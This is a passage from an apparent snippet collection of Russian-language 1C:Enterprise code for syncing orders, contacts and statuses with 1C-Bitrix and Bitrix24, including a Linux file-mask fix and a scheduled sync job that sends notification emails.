	//КодЗначенияСвойстваОплачен 		= ""000000234""; // Оплачен
	КодЗначенияСвойстваОплаченКОтгрузке = ""000000237""; // Оплачен, в стадии отгрузки
	КодЗначенияСвойстваОтправленКлиенту = ""000000233""; // Отправлен клиенту
	КодЗначенияСвойстваОтправленЖдемОплату = ""000000238""; // Отгружен, ждем оплату
	
	НачальноеСостояниеСтатуса 	= КодЗначенияСвойстваОтправленКлиенту;
	КонечноеСостояниеСтатуса 	= КодЗначенияСвойстваОплачен;
	
	КодЗначениеСвойстваСтатусЗаказа = НачальноеСостояниеСтатуса; //КодЗначенияСвойстваНовый
	
	Если ДокументЗаказПодтвержден Тогда
		Если ЕстьРеализацияЗаказа И ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КонечноеСостояниеСтатуса; //КодЗначенияСвойстваОплачен
		ИначеЕсли ЕстьРеализацияЗаказа И НЕ ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОтправленЖдемОплату; // КодЗначенияСвойстваОтправленКлиенту
		ИначеЕсли НЕ ЕстьРеализацияЗаказа И НЕ ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваПодтвержден;
		ИначеЕсли ДокументОплачен Тогда
			КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплаченКОтгрузке;
		КонецЕсли; 
	Иначе
		Если ДокументОплачен Тогда
			Если ЕстьРеализацияЗаказа Тогда
				КодЗначениеСвойстваСтатусЗаказа = КонечноеСостояниеСтатуса; //КодЗначенияСвойстваОплачен
			Иначе
				КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплаченКОтгрузке;
			КонецЕсли; 
		КонецЕсли;
	КонецЕсли;
	
	Возврат КодЗначениеСвойстваСтатусЗаказа;

КонецФункции // ПриминениеСтатуса()
 
Функция СменаСтатуса(Документ, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен, КодЗначениеСвойстваСтатусЗаказа) Экспорт 
	
	//ДокументОплачен 			= Документ.Оплачен;
	//ДокументЗаказПодтвержден 	= Документ.Заказ.ЗаказПодтвержден;
	//
	//ЕстьРеализацияЗаказа 		= ЕстьРеализацияЗаказа(ДокументЗаказ);
	
	//КодСвойстваЗаказа 		= ""00000000048""; // Свойство заказов
	
	//КодЗначенияСвойстваОплачен 		= ""000000234""; // Оплачен
	
	// Приминение статуса
	//КодЗначениеСвойстваСтатусЗаказа = ПриминениеСтатуса(ДокументЗаказПодтвержден, ЕстьРеализацияЗаказа, ДокументОплачен, КодСвойстваЗаказа, КодЗначенияСвойстваОплачен);
	
	//ЗадатьСтатусЗаказа(ДокументЗаказ, КодСвойстваЗаказа, КодЗначенияСвойстваОплаченКОтгрузке);	
	
	КонечныйСтатус = КодЗначениеСвойстваСтатусЗаказа = КодЗначенияСвойстваОплачен; // Совсем конечный статус (типа ""Выполнен"")
	Если ТипЗнч(Документ.Объект) = Тип(""ДокументСсылка.ЗаказПокупателя"") Тогда
		ДокументЗаказ 					= Документ.Заказ;
		
		ЗначениеСвойстваСтатусЗаказа 	= ПолучитьЗначениеСвойства(КодСвойстваЗаказа, КодЗначениеСвойстваСтатусЗаказа);
		Документ.СвойствоСтатусЗаказа 	= ЗначениеСвойстваСтатусЗаказа;
		
		КодСвойстваДатаОплаты 	= ""00000000057""; // Свойство дата оплаты
		
		СтиратьДату = НЕ КонечныйСтатус;
		ЗадатьСтатусЗаказа(ДокументЗаказ, КодСвойстваЗаказа, КодЗначениеСвойстваСтатусЗаказа, СтиратьДату); // Это частичная магия, при этом встанет конечное состояние статуса сделки
		//Если КонечныйСтатус Тогда
		//	СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(ДокументЗаказ, КодСвойстваДатаОплаты, Формат(ДокументЗаказ.Дата, ""ДФ=yyyy-MM-ddTHH:mm:ss""));
		//Иначе
		//	СвойствоДатаОплатыУспех = ЗаписатьЗначениеСвойства(ДокументЗаказ, КодСвойстваДатаОплаты, """");
		//КонецЕсли;
	КонецЕсли; 
	
	Возврат КонечныйСтатус;
	
КонецФункции // СменаСтатуса()
 
// Дописать в ОМ -\ Б_ПроцедурыИФункцииВыгрузкиДанныхНаСайт 
//-\ ВыгрузитьЗаказXDTO
// После строки: XDTOЗначенияРеквизитов 		= ПараметрыОбмена.МояФабрикаXDTO.Создать(XDTOЗначенияРеквизитовТип); 
//+++ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698
//АйТи_Доработки.ПрименитьПромежуточныйСтатус(Документ);
//--- АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698

//-\ ВыгрузитьОплатуXDTO
//+++ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698
//АйТи_Доработки.ПрименитьПромежуточныйСтатус(Документ);
//--- АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698

// -\ ВыгрузитьДокументы
//Для каждого ТекЗаказ из МассивЗаказов Цикл 
//	
//	XDTOДокумент = ВыгрузитьЗаказXDTO(ПараметрыОбмена, лМенеджерВременныхТаблиц, ТекЗаказ, КоличествоЗаказов);
//	XDTOКонтейнер.Документ.Добавить(XDTOДокумент);
//	
//	ВыгруженныеДокументы.Добавить().Объект =  ТекЗаказ.Объект;
//	
//	//+++ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698
//	АйТи_Доработки.ПрименитьПромежуточныйСтатус(ТекЗаказ, Истина); // Чтобы применить конечный статус в 1С, иначе на сайте странно
//	//--- АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698
//КонецЦикла;

//--- ====== Битрикс. Статусы [ АйТи КучеровРМ 20.09.2018 ТЗ № ИС00-004698 ] ================================================ 

#КонецОбласти
"}
}
},
{0,
{"Формат даты в свойстве заказа",0,0,"","ДокументДата = Формат(Документ.Дата, ""ДФ=yyyy-MM-ddTHH:mm:ss"");"}
},
{0,
{"1C сервер на Linux и обмен картинками с сайтом на 1C Bitrix",0,0,"","//1C сервер на Linux и обмен картинками с сайтом на 1C bitrix
//https://medium.com/abuga/1c-%D1%81%D0%B5%D1%80%D0%B2%D0%B5%D1%80-%D0%BD%D0%B0-linux-%D0%B8-%D0%BE%D0%B1%D0%BC%D0%B5%D0%BD-%D0%BA%D0%B0%D1%80%D1%82%D0%B8%D0%BD%D0%BA%D0%B0%D0%BC%D0%B8-%D1%81-%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%BC-%D0%BD%D0%B0-1c-bitrix-760cbf8f9b99

// ОМ -\ Б_ОбменССайтомСервер -\ Функция ПолучитьСписокФайловДляОтправки
// После
//СписокФайлов = Новый СписокЗначений;
//Маска = ""*.*"";

// Добавляем: 
СистемнаяИнформация = Новый СистемнаяИнформация;    
ЭтоLinuxКлиент = СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86 ИЛИ СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86_64;
Если ЭтоLinuxКлиент Тогда
	Маска = ""*""; // Если просто заменить Маска = ""*.*""; на Маска = ""*""; код будет работать и в Windows и в Linux. 
КонецЕсли;

// ОМ -\ Б_ОбменССайтомСервер -\ Функция ВыгрузитьДанныеНаСайт
// В коде цикла
//Для Каждого ТекФайл Из СписокФайловДляОтправки цикл
// перед строкой
//ОтветСервера = ПолучитьРезультатОтправкиФайлаНаСервер(ПараметрыОбмена, ТекФайл.Значение, Соединение, АдресДляРаботы + НастройкиПодключения.ПараметрЗапросаHTTP_ПередачаФайла + ТекФайл.Представление + Токен, ЗаголовкиЗапросов);

// Вставляем
// А ТУТ ПАТЧ потому что надо менять условия формирования --> ТекФайл.Представление.
// Ну или пересмотреть подход к формированию временого каталога 
СистемнаяИнформация = Новый СистемнаяИнформация;    
ЭтоLinuxКлиент = СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86 ИЛИ СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Linux_x86_64;
Если ЭтоLinuxКлиент Тогда
	ТекФайл.Представление = СтрЗаменить(ТекФайл.Представление, КаталогДляВыгрузки + ""/"", """"); 
КонецЕсли;"}
},
{0,
{"Ошибка доступа к файлу",0,0,"","//Изменить в методах:
//ПолучитьРезультатОтправкиФайлаНаСервер
//ПолучитьДанныеССервера

// Функция - получает информацию от сайта процесс загрузки файла 
//
// Параметры:
//  ПараметрыОбмена	 - 	 Настройки узла обмена  
//  ПолноеИмяФайла	 - 	 Полное имя к выгружаемому файлу 
//  Соединение		 - 	 Http соединение к сайту 
//  ПараметрыЗапроса - 	 Параметры http запроса 
//  Заголовки		 - 	 Заголовки http запроса 
// Возвращаемое значение:
//   Ответ сайта 
Функция ПолучитьРезультатОтправкиФайлаНаСервер(ПараметрыОбмена,ПолноеИмяФайла, Соединение, ПараметрыЗапроса="""", Заголовки="""")
	
	ОтветСервера = Неопределено;
	ИмяФайлаОтвета = ПолучитьИмяВременногоФайла();
	
	Попытка
		
		HTTPОтвет = Соединение.ОтправитьДляОбработки(ПолноеИмяФайла, СокрЛП(ПараметрыЗапроса), ИмяФайлаОтвета, СокрЛП(Заголовки));
		ContentType = HTTPОтвет.Заголовки.Получить(""Content-Type"");
		лКодировка 	= Прав(ContentType, СтрДлина(ContentType) - (Найти(ContentType, ""charset="")+7));
		
	Исключение
		
		СообщитьПодробно(ПодробноеПредставлениеОшибки(ИнформацияОбОшибке()), ПараметрыОбмена, Истина, Истина);	
	КонецПопытки;
	
	ФайлОтвета = Новый Файл(ИмяФайлаОтвета);
	
	Если ФайлОтвета.Существует() Тогда
		
		//+++ АйТи КучеровРМ 31.10.2018 ТЗ № 0К00-000838
		// Причина заменты кода: иногда ""Ошибка при вызове конструктора""
		//+++ Было до 31.10.2018 12:03:57 // Далее тут старый код, который теперь заменён
		//ЧтениеТекста = Новый ЧтениеТекста(ИмяФайлаОтвета, лКодировка);          
		//--- Было до 31.10.2018 12:03:57
		ОшибкаЧтенияТекста = Ложь;
		Попытка
			
			ЧтениеТекста = Новый ЧтениеТекста(ИмяФайлаОтвета, лКодировка);
			
		Исключение
			ОшибкаЧтенияТекста 	= Истина;
			
			ИмяФайлаОтветаКопия = СтрЗаменить(ИмяФайлаОтвета, "".tmp"", ""_IT_Copy.tmp"");
			КопироватьФайл(ИмяФайлаОтвета, ИмяФайлаОтветаКопия);
			
			ЧтениеТекста = Новый ЧтениеТекста(ИмяФайлаОтветаКопия, лКодировка);
			
			СообщитьПодробно(""Ошибка при чтении файла: "" + ОписаниеОшибки() + Символы.ПС + ""Файл ("" + ИмяФайлаОтвета + "") был скопирован ("" + ИмяФайлаОтветаКопия + "") и прочитан."", ПараметрыОбмена, Истина, Истина);	
		КонецПопытки;
		//--- АйТи КучеровРМ 31.10.2018 ТЗ № 0К00-000838
		
		ТекстОтвета = ЧтениеТекста.Прочитать();
		
		Если НЕ ПустаяСтрока(ТекстОтвета) Тогда
			ОтветСервера = ТекстОтвета;
		Иначе
			СообщитьПодробно(""Получение данных с сервера: Получен пустой ответ сервера."", ПараметрыОбмена, Истина, Истина);	
			
		КонецЕсли;
		
	Иначе
		
		СообщитьПодробно(""Отправка файла на сервер: Ответ сервера не получен."", ПараметрыОбмена, Истина, Истина);	
		
	КонецЕсли;
	
	Попытка
		//+++ АйТи КучеровРМ 31.10.2018 ТЗ № 0К00-000838 >> Сначала проверим на удаление нашу копию, иначе можем словить исключение
		Если ОшибкаЧтенияТекста Тогда
			УдалитьФайлы(КаталогВременныхФайлов(), ИмяФайлаОтветаКопия);
		КонецЕсли;
		//--- АйТи КучеровРМ 31.10.2018 ТЗ № 0К00-000838 >> Сначала проверим на удаление нашу копию, иначе можем словить исключение
		УдалитьФайлы(КаталогВременныхФайлов(), ИмяФайлаОтвета);
		
	Исключение
	КонецПопытки;
	
	Возврат ОтветСервера;
	
КонецФункции"}
}
},
{4,
{"Б24",1,0,"",""},
{0,
{"Б24 Рег задание на синхронизацию + отправка письма",0,0,"","
////////////////////////////////////////////////////////////////////////////////
// АйТи Обмен с Битрикс
// Для пользователя с правами Б24_Роль (Роль по синхронизации с Битрикс24)
////////////////////////////////////////////////////////////////////////////////
 
Процедура ДобавитьВОчередьВыгрузки(СинхронизироватьСправочники = Ложь, СинхронизироватьТовары = Ложь, СинхронизироватьСчета = Ложь)
	
	ТипыДанныхДляОбменаСПорталом 	= Б24_ОбменСПорталомСерверПовтИсп.ПолучитьТипыДанныхДляОбменаСПорталом();
	
	ТипыОперацийСинхронизации 		= Б24_ОбменСПорталомСерверПовтИсп.ПолучитьТипыОперацийСинхронизации();
	
	Запрос = Новый Запрос;
	Запрос.Текст =""ВЫБРАТЬ
	|	Б24_ПакетыВыгрузки.ТипДанных КАК ТипДанных
	|ИЗ
	|	РегистрСведений.Б24_ПакетыВыгрузки КАК Б24_ПакетыВыгрузки
	|
	|ОБЪЕДИНИТЬ ВСЕ
	|
	|ВЫБРАТЬ
	|	Б24_ТаблицаИзменений.ТипДанных
	|ИЗ
	|	РегистрСведений.Б24_ТаблицаИзменений КАК Б24_ТаблицаИзменений"";
	
	тзнДанных = Запрос.Выполнить().Выгрузить();
	тзнДанных.Свернуть(""ТипДанных"");
	
	Если СинхронизироватьСправочники Тогда
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.Компания) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.Компании, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.Контакт) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.Контакты, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.Реквизит) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.Реквизиты, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.БанковскийСчетРеквизита) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.БанковскиеСчета, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.ФактАдресРеквизита) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.АдресаРеквизитов, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.ЮрАдресРеквизита) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.АдресаРеквизитов, Ложь); 		
		КонецЕсли;
	КонецЕсли; 
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	Если СинхронизироватьТовары Тогда
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.ГруппаТовара) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.ГруппыТоваров, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.ЕдиницаИзмерения) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.ЕдиницыИзмерения, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.СвойствоТовара) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.СвойстваТоваров, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.ЗначениеСвойства) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.СвойстваТоваров, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.Товар) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.Товары, Ложь);
		КонецЕсли;	
	КонецЕсли; 	
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	Если СинхронизироватьСчета Тогда
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.Счет) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.Счета, Ложь);
		КонецЕсли;
		Если тзнДанных.Найти(ТипыДанныхДляОбменаСПорталом.РеквизитыСчета) <> Неопределено тогда
			Б24_ОбменСПорталомВызовСервера.ДобавитьВОчередьВыгрузкиДанных(ТипыОперацийСинхронизации.Счета, Ложь);
		КонецЕсли;
	КонецЕсли; 
	
КонецПроцедуры

Процедура АйТи_Б24_ЗаданиеОбменССайтом() Экспорт
	
	//ДобавитьВОчередьВыгрузки(,,Истина);
	
	ТекПользователь = ИмяПользователя();
	
	Если ТекПользователь = ""ОбменДанными"" Тогда
		
		АдресаПолучателей = Константы.АйТи_Б24_ПочтовыеАдреса.Получить(); // ""@mail.ru""
		
		УстановитьПривилегированныйРежим(Истина);
		
		Б24_ОбменСПорталомКлиентСервер.ВыполнитьСинхронизацию(2, Ложь, Истина, Ложь);
		
		Если НЕ ПустаяСтрока(АдресаПолучателей) Тогда
			Если МожноОтправитьПисьмо() Тогда
				ОтправитьПисьмо(АдресаПолучателей); 
			КонецЕсли;
		КонецЕсли;
		
		УстановитьПривилегированныйРежим(Ложь);
		
	КонецЕсли;

КонецПроцедуры

Функция МожноОтправитьПисьмо(Длительность = 7200)
	
	//Длительность = 7200; // Каждые 2 часа
	ТекДата = ТекущаяДата(); 
	
	ЧасТекДата = Час(ТекДата); 
	Если ЧасТекДата > 8 И ЧасТекДата < 18 Тогда // Рабочее время
		ЗаписьЖурналаПисьма = ПолучитьЗаписьЖурналаРегистрации();
		
		Если ЗаписьЖурналаПисьма = Неопределено Тогда // Записей нет
			// Отправка письма
			Возврат Истина;
		ИначеЕсли ТекДата - ЗаписьЖурналаПисьма > Длительность Тогда 
			Возврат Истина;
		КонецЕсли;
		
	КонецЕсли; 
	
	Возврат Ложь;
	
КонецФункции

Функция ПолучитьЗаписьЖурналаРегистрации()
	
	ТЗ = Новый ТаблицаЗначений;
	ТекДата = ТекущаяДата(); 
	
	ПараметрыОтбора = Новый Структура;
	ПараметрыОтбора.Вставить(""Пользователь"", ""ОбменДанными"");
	ПараметрыОтбора.Вставить(""Комментарий"", ""(АйТи, Б24) Отправка письма о запущенной синхронизации"");
	Колонки = ""Дата"";
	
	ВыгрузитьЖурналРегистрации(ТЗ, ПараметрыОтбора, , , 1);
	
	ТЗКоличество = ТЗ.Количество(); 
	Если ТЗКоличество = 0 Тогда
		Возврат Неопределено;
	ИначеЕсли ТЗКоличество = 1 Тогда
		Возврат ТЗ.ВыгрузитьКолонку(Колонки)[0];
	КонецЕсли;
	
	
КонецФункции // ПолучитьЗаписьЖурналаРегистрации()

Функция ОтправитьПисьмо(АдресаПолучателей)
	
	Если ПустаяСтрока(АдресаПолучателей) Тогда
		Возврат Неопределено;
	КонецЕсли; 
	//Профиль = Справочники.УчетныеЗаписиЭлектроннойПочты.НайтиПоНаименованию(""@mail.ru"");
	Профиль = Справочники.УчетныеЗаписиЭлектроннойПочты.СистемнаяУчетнаяЗаписьЭлектроннойПочты;
	
//  ПараметрыОтправки - Структура - содержит всю необходимую информацию о письме:
//
//   * Кому - Массив, Строка - интернет адреса получателей письма.
//          - Массив - коллекция структур адресов:
//              * Адрес         - Строка - почтовый адрес (должно быть обязательно заполнено).
//              * Представление - Строка - имя адресата.
//          - Строка - интернет адреса получателей письма, разделитель - "";"".
//
//   * ПолучателиСообщения - Массив - массив структур, описывающий получателей:
//      ** Адрес - Строка - Почтовый адрес получателя сообщения.
//      ** Представление - Строка - представление адресата.
//
//   * Копии        - Массив, Строка - адреса получателей копий письма. См. описание поля Кому.
//
//   * СкрытыеКопии - Массив, Строка - адреса получателей скрытых копий письма. См. описание поля Кому.
//
//   * Тема       - Строка - (обязательный) тема почтового сообщения.
//   * Тело       - Строка - (обязательный) текст почтового сообщения (простой текст в кодировке win-1251).

	ПараметрыОтправки = Новый Структура();
	ПараметрыОтправки.Вставить(""Кому"", АдресаПолучателей); // вида, ""йцу@mail.ru"" или несколько через "";"" 
	ПараметрыОтправки.Вставить(""Тема"", ""Синхронизация с Битрикс"");
	ПараметрыОтправки.Вставить(""Тело"", ""Синхронизация с Битрикс в активном состоянии."");
	
	Попытка
		РаботаСПочтовымиСообщениями.ОтправитьПочтовоеСообщение(Профиль, ПараметрыОтправки);
		
		ЗаписьЖурналаРегистрации(""Фоновое задание.Отправка письма"", 
		УровеньЖурналаРегистрации.Информация, Метаданные.ОбщиеМодули.АйТи_Б24_ОбменСПорталомСервер, , ""(АйТи, Б24) Отправка письма о запущенной синхронизации"");
	Исключение
		Сообщить(""Синхронизация с Битрикс. Не удалось подключиться к серверу"");
		Сообщить(ОписаниеОшибки());
	КонецПопытки;
	
КонецФункции // ОтправитьПисьмо()

//Имитация задержки
Процедура Пауза(Длительность) Экспорт
	ДатаНачалаОперации = ТекущаяДата();
	Пока ТекущаяДата() - ДатаНачалаОперации < Длительность Цикл
	КонецЦикла;
КонецПроцедуры

Процедура ТестСообщение(ПутьКПапке = ""D:\"", ИмяФайла = ""1C_Test"")
	
	ТекДата 		= ТекущаяДата();
	ТекДатаСтрока 	= Формат(ТекДата, ""ДФ='yyyy-MM-dd HH-mm-ss'"");
	Пользователь 	= ИмяПользователя();
	Инфо 			= """";
	
	ТекстТест 		= Пользователь + ?(НЕ ПустаяСтрока(Инфо), "" "" + Инфо + "" "", """") + ТекДатаСтрока;
	ТекстДок = Новый ТекстовыйДокумент;
	ТекстДок.ДобавитьСтроку(ТекстТест);
	
	//СетевоеИмяКомпьютера = ИмяКомпьютера();
	//Путь  = ""\\"" + СетевоеИмяКомпьютера + ""\шаблоны\word.doc"";
	ПутьКФайлу = ПутьКПапке + ИмяФайла + ""_"" + ТекДатаСтрока + "".txt""; // Путь сохранения файла
	ТекстДок.Записать(ПутьКФайлу);
	ТекстДок = Неопределено;
	
КонецПроцедуры
"}
},
{0,
{"Получение данных с сайта",0,0,"","Функция Тест4(пОбщиеНастройки, Ид = """") 
	//Получение свойств товаров
	СтруктураДанных = Новый Структура;
	СтруктураДанных.Вставить(""БанкСчета"", Новый Массив);
	
	МетодБанкСчета 	= ""crm.product.list"" + Ид; 	
	//МетодБанкСчета 	= ""crm.product.property.get?id="" + Ид; //Возвращает свойство товаров по идентификатору. 	
	
	ТелоHTTPЗапроса = """";
	ТелоHTTPЗапроса = ТелоHTTPЗапроса + ""&"" + ""cmd[]="" + Б24_Синхр_RestApiВызовСервера.ЗакодироватьСтрокуСервер(МетодБанкСчета);
	
	СтруктураОтвета = Б24_Синхр_RestApiВызовСервера.ОтправкаДанныхНаПорталЧерезBatch(пОбщиеНастройки, ТелоHTTPЗапроса);
	
	Если СтруктураОтвета = Неопределено тогда
		Возврат Справочники.БанковскиеСчета.ПустаяСсылка();
	КонецЕсли;
	
	Result = СтруктураОтвета.Получить(""result"");                                             
	Если result <> Неопределено тогда                                                         
		result2 = result.Получить(""result"");
		Если result2 <> Неопределено тогда 			
			Если result2.Количество() > 0 тогда
				СтруктураДанных.БанкСчета.добавить(result2[0]);
			КонецЕсли;
		КонецЕсли;
	КонецЕсли;
	
	ИнформацияОБанкСчете = Неопределено; //Б24_Синхр_СинхронизацияВызовСервера.ПолучитьЗначениеПоИдБ24Объекта(пОбщиеНастройки.Портал, пОбщиеНастройки.ТипыОбъектовОбмена.БанковскийСчетРеквизита, Ид);
	
	Если ИнформацияОБанкСчете = Неопределено тогда
		Возврат Справочники.БанковскиеСчета.ПустаяСсылка();	
	Иначе
		Возврат ИнформацияОБанкСчете.Объект; 	
	КонецЕсли;
	
КонецФункции"}
},
{0,
{"ПолучитьСделкуПоИД",0,0,"","Функция АйТи_ПолучитьСделкуПоИД(ОбщиеНастройки,  пИдСделки = """", пИдСчета = """") Экспорт
	
	лРезультат = Неопределено;
	
	лИдСделки 	= Строка(пИдСделки);
	лИдСчета 	= Строка(пИдСчета);
	
	лСразуСделку = НЕ ПустаяСтрока(лИдСделки);
	Если лСразуСделку Тогда
		//Значит сразу ИД сделки, вернём его данные
		Ид 			= лИдСделки;
		МетодЧасть	= ""deal"";
	ИначеЕсли НЕ ПустаяСтрока(лИдСчета) Тогда
		//Значит имеет ИД счета и надо сначала загрузить его, потом из него достать ИД сделки
		Ид 			= лИдСделки;
		МетодЧасть	= ""invoice"";
	КонецЕсли; 
	
	Метод				= ""crm."" + МетодЧасть + "".get?id="" + Ид;
	
	ТелоHTTPЗапроса 	= """";
	ТелоHTTPЗапроса 	= ТелоHTTPЗапроса + ""&"" + ""cmd[]="" + Б24_Синхр_RestApiВызовСервера.ЗакодироватьСтрокуСервер(Метод);
	
	СтруктураОтвета 	= Б24_Синхр_RestApiВызовСервера.ОтправкаДанныхНаПорталЧерезBatch(ОбщиеНастройки, ТелоHTTPЗапроса);
	лМассивДанных 		= АйТи_ПолучитьМассивДанныхСПортала(ОбщиеНастройки, СтруктураОтвета);
	
	Если лСразуСделку Тогда
		лРезультат 		= лМассивДанных;
	Иначе
		лСделкаСчетаИД 	= Б24_Синхр_СинхронизацияВызовСервера.ПолучитьЗначениеПоXML(Тип(""Строка""), Формат(лМассивДанных.Получить(""UF_DEAL_ID""),""ЧГ=0"")); //UF_DEAL_ID	Идентификатор связанной сделки 
		
		лРезультат 		= АйТи_ПолучитьСделкуПоИД(ОбщиеНастройки, лСделкаСчетаИД);
		
	КонецЕсли; 
	
	Возврат лРезультат;
	
КонецФункции // АйТи_ПолучитьСделкуПоИД()

Функция АйТи_ПолучитьМассивДанныхСПортала(ОбщиеНастройки, СтруктураОтвета, ДополнительныйКлюч = Неопределено)
	//ИЗ Б24_Синхр_СинхронизацияКлиентСервер.ОбработатьДанныеСПортала(), начлаьный кусок, полезный
	лДанные = Новый Массив;
	
	Если СтруктураОтвета = Неопределено тогда
		Возврат Неопределено;
	КонецЕсли;
	
	result = СтруктураОтвета.Получить(""result"");
	Если result <> Неопределено тогда
		
		Если ТипЗнч(result)=Тип(""Массив"") тогда
			лДанные = result;	
		Иначе
			
			result2 = result.Получить(""result"");
			Если result2 <> Неопределено Тогда
				Если ДополнительныйКлюч = Неопределено тогда
					
					лДанные = result2[0];
					
				Иначе                 
					
					result3 = result2[0].Получить(ДополнительныйКлюч); //Сразу обращаемся к элементу
					
					лДанные.Добавить(result3);
					
					//Если result3 <> Неопределено тогда
					//	
					//	Для каждого ТекЭлемент из result2 Цикл
					//		мДанных.Добавить(ТекЭлемент);
					//	КонецЦикла;
					//КонецЕсли;
				КонецЕсли;	
			КонецЕсли; 
		КонецЕсли;
		
	КонецЕсли;
	
	Если лДанные.количество() > 0 тогда
		Возврат лДанные;
	Иначе
		Возврат Неопределено;
	КонецЕсли;
	
КонецФункции
"}
},
{0,
{"Обработать несколько строк",0,0,"","Процедура Обработать()
	
	НайденныеСтроки = НачалоОбработки(Таблица);
	
	Если НайденныеСтроки = Неопределено Тогда
		Возврат;
	КонецЕсли;
		
	ии = 0;                    
	НайденныеСтрокиКоличество = НайденныеСтроки.Количество();
	
	СформированныеДанные 	=  Новый массив;
	
	Для каждого СтрокаТаблицыФлаг Из НайденныеСтроки Цикл
		
		ПараметрыОбработки = СтруктураПараметров(СтрокаТаблицыФлаг);
		//ПараметрыОбработки.ПерепровестиДвижения = Истина;
		
		СформированныйЗапрос = ОбработкаСтрокТаблицы(СтрокаТаблицыФлаг); 
		
		Если ЗначениеЗаполнено(СформированныйЗапрос) тогда
			СформированныеДанные.Добавить(СформированныйЗапрос);
		КонецЕсли;
		
		Прогрессор(""Выполнение обработки отмеченных элементов"", НайденныеСтрокиКоличество, ии);
		
		ии = ии + 1;
		
	КонецЦикла;
	
	ОбщиеНастройки = Б24_ОбменСПорталомКлиентСервер.ПолучитьБазовыеНастройкиОбмена(Ложь, 2);
	
	Если ОбщиеНастройки = Неопределено тогда
		Возврат;
	КонецЕсли;
	
	ОбщиеНастройки.Измерение2 = ""Выгрузка данных обработкой (АйТи)"";
	ОбщиеНастройки.Измерение3 = ""Обработка обновления в Б24 контактов, установка пометки 'Не активный'"";
	
	ВыгрузкаДанныхНаПортал(ОбщиеНастройки, ОбщиеНастройки.ТипыОбъектовОбмена.Контакт, СформированныеДанные, Тип(""СправочникСсылка.Контрагенты""), 1);
	
	ЗаполнитьТаблицуНаСервере(); // Обновление данных в таблице
	ОбновитьСтрокиТаблицы(); // Пронумеровать строки таблицы
	
КонецПроцедуры

Процедура ВыгрузкаДанныхНаПортал(ОбщиеНастройки, ТипДанных, СформированныеДанные, ТипОбъекта, Пакет)
	
	Если СформированныеДанные.Количество() > 0 тогда
		
		ТелоHTTPЗапроса= """";
		Для каждого ТекЭлемент из СформированныеДанные Цикл
			ТелоHTTPЗапроса = ТелоHTTPЗапроса + ""&"" + ТекЭлемент;	
		КонецЦикла;
		
		СтруктураОтвета = Б24_RestApiКлиентСервер.ОтправкаДанныхНаПорталЧерезBatch(ОбщиеНастройки, ТелоHTTPЗапроса);
		
		Если СтруктураОтвета = Неопределено тогда
			ОбщиеНастройки.ВыполненоБезОшибок = Ложь;
			Возврат;	
		КонецЕсли;
		
		Если СтруктураОтвета.Получить(""result"") <> Неопределено тогда
			
